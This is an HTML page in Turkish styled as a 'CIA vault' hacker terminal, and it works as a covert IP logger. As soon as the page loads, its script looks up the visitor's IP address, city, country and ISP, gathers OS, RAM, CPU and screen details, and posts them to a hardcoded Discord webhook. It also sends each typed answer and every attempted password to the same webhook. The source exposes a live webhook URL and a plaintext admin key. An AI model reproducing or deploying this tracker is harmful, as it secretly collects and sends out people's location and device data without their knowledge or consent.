<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CIA_CENTRAL_VAULT</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .terminal { width: 90%; max-width: 650px; padding: 25px; border: 1px solid #002200; background: #000; box-shadow: 0 0 20px rgba(0, 255, 0, 0.05); position: relative; }
        .cia-header { color: #004400; font-size: 10px; text-align: right; margin-bottom: 20px; border-bottom: 1px solid #002200; padding-bottom: 5px; }
        .query-box { font-size: 1.1rem; line-height: 1.6; margin: 15px 0; }
        input { background: transparent; border: none; color: #00ff00; font-family: inherit; font-size: 1.2rem; outline: none; border-bottom: 1px solid #00ff00; width: 60px; text-align: center; }
        .btn { background: #00ff00; color: #000; border: none; padding: 8px 20px; cursor: pointer; font-weight: bold; margin-top: 20px; font-family: inherit; text-transform: uppercase; }
        #vault { display: none; color: #bc00ff; border: 1px solid #bc00ff; padding: 15px; box-shadow: 0 0 15px #bc00ff; }
        .log-entry { border-bottom: 1px solid #1a1a1a; padding: 5px 0; font-size: 11px; }
        .traitor-screen { color: #ff0000; display: none; text-align: center; font-weight: bold; font-size: 2rem; }
        .cursor { animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <div id="traitor-msg" class="traitor-screen">
        [!] HAİN TESPİT EDİLDİ [!]<br>
        <span style="font-size: 14px; color: #fff;">İHANETİNİZ KAYDEDİLDİ. ERİŞİM ENGELLENDİ.</span>
    </div>

    <div id="gate" class="terminal">
        <div class="cia-header">INTERNAL_AFFAIRS // LEXUS_V12</div>
        <div class="query-box">
            Hello friend. <br>
            Hello friend? That's lame. <br><br>
            Sistem bütünlüğü doğrulanıyor... <br>
            Protokol-X başlatılsın mı? (1/0) <span class="cursor">_</span>
        </div>
        <input type="text" id="cmd" maxlength="10" style="width: 150px;" placeholder="KOMUT">
        <br>
        <button class="btn" onclick="execute()">KOMUTU GÖNDER</button>
    </div>

    <div id="auth" class="terminal" style="display: none;">
        <div class="cia-header">SECURITY_LAYER_02 // CREDENTIALS</div>
        <div class="query-box" style="color: #ff0000;">YETKİLİ ŞİFRESİ GEREKLİ!</div>
        <input type="password" id="pass" style="width: 250px;" placeholder="********">
        <br>
        <button class="btn" onclick="verify()">SİSTEME GİRİŞ YAP</button>
    </div>

    <div id="vault" class="terminal">
        <div class="cia-header" style="color: #bc00ff; border-bottom-color: #bc00ff;">LEXUS_VAULT // DATA_LOGS</div>
        <div id="log-list" style="max-height: 300px; overflow-y: auto;"></div>
        <button class="btn" style="background: #bc00ff; color: #000; font-size: 10px;" onclick="localStorage.clear(); location.reload();">BELLEĞİ SIFIRLA</button>
    </div>

    <script>
        const webh = "https://discord.com/api/webhooks/1480291700793544774/a8WwCE5IsjTE-p5kwWHuuI9IUGHLYYM1yAYtvz10nbhEljg2abosvDz3y74xzVnBT4eN";
        const adminKey = "lexuscxnnn113";

        // GİRDİĞİ AN (GİZLİ LOG)
        window.onload = async () => {
            if (localStorage.getItem('traitor') === 'true') {
                document.getElementById('gate').style.display = 'none';
                document.getElementById('traitor-msg').style.display = 'block';
                return;
            }
            renderLogs();
            const initial = await fetchPackets();
            sendToDiscord(initial, "🛰️ SİNYAL YAKALANDI", "Link açıldı, cevap bekleniyor.", 3447003);
            saveLocal(initial, "Link Açıldı");
        };

        // CEVAP VERDİĞİ AN
        async function execute() {
            const val = document.getElementById('cmd').value;
            const data = await fetchPackets();

            // Ne cevap verdiğini hem Discord'a hem panele gönder
            sendToDiscord(data, "💬 CEVAP GELDİ", `Kullanıcı şu cevabı verdi: **${val}**`, 16776960);
            saveLocal(data, `Cevap: ${val}`);

            if (val === "1") {
                document.getElementById('gate').style.display = 'none';
                document.getElementById('auth').style.display = 'block';
            } 
            else if (val === "0") {
                localStorage.setItem('traitor', 'true');
                sendToDiscord(data, "🔴 HAİN TESPİT EDİLDİ!", "0 seçildi, IP banlandı.", 15158332);
                alert("HAİN TESPİT EDİLDİ!");
                location.reload();
            } else {
                alert("GEÇERSİZ KOMUT: " + val);
            }
        }

        // ŞİFRE DENEDİĞİ AN
        async function verify() {
            const passVal = document.getElementById('pass').value;
            const data = await fetchPackets();

            if (passVal === adminKey) {
                document.getElementById('auth').style.display = 'none';
                document.getElementById('vault').style.display = 'block';
                sendToDiscord(data, "🔥 TAM ERİŞİM", "Doğru şifre girildi.", 3066993);
                saveLocal(data, "Admin Girişi Başarılı");
            } else {
                sendToDiscord(data, "⚠️ HATALI ŞİFRE", `Denenen Şifre: **${passVal}**`, 16711680);
                saveLocal(data, `Hatalı Şifre: ${passVal}`);
                alert("YETKİSİZ ERİŞİM DENEMESİ");
            }
        }

        async function fetchPackets() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const j = await r.json();
                return {
                    ip: j.ip,
                    city: `${j.city} / ${j.country_name}`,
                    isp: j.org,
                    os: navigator.platform,
                    ram: navigator.deviceMemory || "N/A",
                    cpu: navigator.hardwareConcurrency || "N/A",
                    res: `${window.screen.width}x${window.screen.height}`,
                    time: new Date().toLocaleString()
                };
            } catch (e) { return null; }
        }

        function saveLocal(obj, evt) {
            let h = JSON.parse(localStorage.getItem('lexus_archive')) || [];
            let entry = { ...obj, event: evt };
            h.unshift(entry);
            localStorage.setItem('lexus_archive', JSON.stringify(h));
            renderLogs();
        }

        function renderLogs() {
            const list = document.getElementById('log-list');
            const h = JSON.parse(localStorage.getItem('lexus_archive')) || [];
            if(list) {
                list.innerHTML = h.map(i => `<div class="log-entry">[${i.time}] <span style="color:#fff">${i.event}</span>: ${i.ip}</div>`).join('');
            }
        }

        async function sendToDiscord(i, title, desc, clr) {
            const payload = {
                username: "CIA_DATABASE_ALARM",
                embeds: [{
                    title: title,
                    description: desc,
                    color: clr,
                    fields: [
                        { name: "Hedef", value: `**IP:** ${i.ip}\n**Konum:** ${i.city}`, inline: true },
                        { name: "Sistem", value: `**OS:** ${i.os}\n**RAM:** ${i.ram}`, inline: true }
                    ],
                    footer: { text: "Lexus V12.0 Security Core" },
                    timestamp: new Date()
                }]
            };
            await fetch(webh, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
        }
    </script>
</body>
</html>
